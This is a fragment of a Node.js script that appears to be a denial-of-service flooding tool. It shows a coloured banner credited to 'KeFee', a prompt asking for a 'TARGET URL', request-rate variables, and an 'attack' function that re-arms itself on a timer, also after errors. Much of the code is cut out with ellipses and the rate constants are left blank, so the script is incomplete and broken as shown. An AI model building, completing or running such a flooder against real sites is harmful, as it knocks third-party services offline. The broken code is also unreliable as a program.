...
` + '\033[38;5;196m───────────────────────────────────────────\n' +
'\033[38;5;196m[\033[38;5;46m+\033[38;5;196m]\033[38;5;46m VERSION  \033[38;5;196m : \033[38;5;46m1.0\n' +
'\033[38;5;196m[\033[38;5;46m+\033[38;5;196m]\033[38;5;46m AUTHOR   \033[38;5;196m : \033[38;5;46mKeFee\n' +
'\033[38;5;196m───────────────────────────────────────────\n' +
...
function askForUrl() {
    rl.question(`\x1b[31m┌─[ \x1b[32m[TARGET URL]\x1b[31m ]─────[ # ]\x1b[0m\n\x1b[31m└─[ \x1b[32m\W\x1b[31m ]────► \x1b[0m`, (url) => {
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            ...
            const maxRequests = ;
            const requestsPerSecond = ;
            ...
            const attack = () => {
                try {
                    ...
                    setTimeout(attack, 10 / requestsPerSecond);
                } catch (error) {
                    console.log("Error: " + error.message);
                    setTimeout(attack, 10 / requestsPerSecond);
                }
